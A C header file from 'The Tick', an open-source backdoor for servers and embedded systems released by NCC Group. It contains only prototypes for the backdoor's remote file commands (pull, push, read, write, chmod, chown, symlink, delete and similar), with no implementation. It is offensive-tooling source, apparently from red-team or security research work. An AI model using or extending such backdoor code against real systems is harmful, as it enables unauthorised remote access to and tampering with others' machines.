/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef FILE_H
#define FILE_H

#include "common.h"
#include "parser.h"

ssize_t get_free_space(const char *pathname);

// v0.1 commands
void do_file_pull(Parser *p);
void do_file_push(Parser *p);
void do_file_unlink(Parser *p);
void do_file_chmod(Parser *p);

// v0.2 commands
void do_file_open(Parser *p);
void do_file_read(Parser *p);
void do_file_write(Parser *p);
void do_file_stat(Parser *p);
void do_file_readdir(Parser *p);
void do_file_readlink(Parser *p);
void do_file_symlink(Parser *p);
void do_file_link(Parser *p);
void do_file_rmdir(Parser *p);
void do_file_mkdir(Parser *p);
void do_file_chown(Parser *p);
void do_file_access(Parser *p);
void do_file_statvfs(Parser *p);
void do_file_truncate(Parser *p);

#endif /* FILE_H */
